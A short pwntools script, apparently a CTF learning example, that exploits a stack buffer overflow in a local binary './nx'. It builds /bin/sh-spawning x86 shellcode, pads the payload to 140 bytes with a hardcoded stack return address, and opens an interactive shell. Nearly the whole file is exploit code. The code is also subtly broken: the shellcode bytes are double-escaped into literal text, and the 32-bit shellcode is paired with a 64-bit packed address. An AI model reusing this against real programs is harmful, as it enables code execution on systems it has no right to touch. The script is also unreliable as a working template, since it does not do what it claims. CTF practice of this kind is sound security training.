# -*- coding: utf-8 -*-
"""
文 件 名: pwn_example.py
文件描述: pwn 是一个 Python 库，用于编写和执行漏洞利用、CTF（Capture The Flag）挑战和安全研究等任务
作    者: HanKin
创建日期: 2023.12.13
修改日期：2023.12.13

Copyright (c) 2023 HanKin. All rights reserved.
"""
from pwn import *

p = process('./nx')
ret = 0x7ffeb8b02130

shellcode = b"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73"
shellcode += b"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0"
shellcode += b"\\x0b\\xcd\\x80"
print(shellcode)

payload = shellcode + b'A' * (140 - len(shellcode)) + p64(ret)
print(payload)

p.send(payload)
p.interactive()